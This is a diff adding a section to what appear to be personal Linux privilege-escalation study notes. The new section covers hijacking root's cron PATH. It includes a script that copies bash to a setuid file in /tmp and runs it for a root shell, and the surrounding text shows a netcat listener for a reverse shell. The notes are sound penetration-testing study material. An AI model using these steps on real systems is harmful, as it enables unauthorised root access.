@@ -151,9 +151,30 @@ nc -lvnp 4444
 
 and a root shell should spawn!!
 
-#
+## Cronjob Enivornmental Variables
 
+Can change a script (run by root) using cronjob to activate another script giving us root access.
 
+Example
 
+In this example the path variable leads to /home/user. We can exploit this by putting a script
+here so it is excuted before the cronjob looks further for the actual script.
+
+~~~
+cronjob is overwrite.sh
+
+vi ~/home/user/overwrite.sh
+
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+chmod +x /home/user/overwrite.sh
+
+/tmp/rootbash -p
+~~~
+
+## Cronjobs wildcards.
 
 
